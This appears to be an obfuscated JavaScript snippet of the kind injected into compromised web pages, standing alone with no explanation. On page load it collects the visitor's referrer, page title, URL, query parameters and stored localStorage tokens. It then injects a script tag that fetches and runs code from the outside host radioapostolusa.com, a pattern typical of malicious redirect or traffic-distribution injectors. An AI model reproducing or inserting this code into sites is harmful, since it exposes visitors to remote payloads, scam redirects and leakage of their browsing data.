<script>
    (function() {
    var name = '_QxWSF2zj5SjhfTNz';
    if (!window._QxWSF2zj5SjhfTNz) {
        window._QxWSF2zj5SjhfTNz = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://radioapostolusa.com/pJhktJ',
            P_PATH: 'https://radioapostolusa.com/79f10ac/postback',
        };
    }
    const _8Jt4239sjw7hKhPp = localStorage.getItem('config');
    if (typeof _8Jt4239sjw7hKhPp !== 'undefined' && _8Jt4239sjw7hKhPp !== null) {
        var _1HWBZsgw16mtqcSG = JSON.parse(_8Jt4239sjw7hKhPp);
        var _7GKm9PGjGWKQ4hYz = Math.round(+new Date()/1000);
        if (_1HWBZsgw16mtqcSG.created_at + window._QxWSF2zj5SjhfTNz.ttl < _7GKm9PGjGWKQ4hYz) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _RwdzP4X6sWYvsnFV = localStorage.getItem('subId');
    var _gbSNwp1hFx7snNLD = localStorage.getItem('token');
    var _RNtcgMm4ST9NPgMV = '?return=js.client';
        _RNtcgMm4ST9NPgMV += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _RNtcgMm4ST9NPgMV += '&se_referrer=' + encodeURIComponent(document.referrer);
        _RNtcgMm4ST9NPgMV += '&default_keyword=' + encodeURIComponent(document.title);
        _RNtcgMm4ST9NPgMV += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _RNtcgMm4ST9NPgMV += '&name=' + encodeURIComponent(name);
        _RNtcgMm4ST9NPgMV += '&host=' + encodeURIComponent(window._QxWSF2zj5SjhfTNz.R_PATH);
    if (typeof _RwdzP4X6sWYvsnFV !== 'undefined' && _RwdzP4X6sWYvsnFV && window._QxWSF2zj5SjhfTNz.unique) {
        _RNtcgMm4ST9NPgMV += '&sub_id=' + encodeURIComponent(_RwdzP4X6sWYvsnFV);
    }
    if (typeof _gbSNwp1hFx7snNLD !== 'undefined' && _gbSNwp1hFx7snNLD && window._QxWSF2zj5SjhfTNz.unique) {
        _RNtcgMm4ST9NPgMV += '&token=' + encodeURIComponent(_gbSNwp1hFx7snNLD);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._QxWSF2zj5SjhfTNz.R_PATH + _RNtcgMm4ST9NPgMV;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    </script>
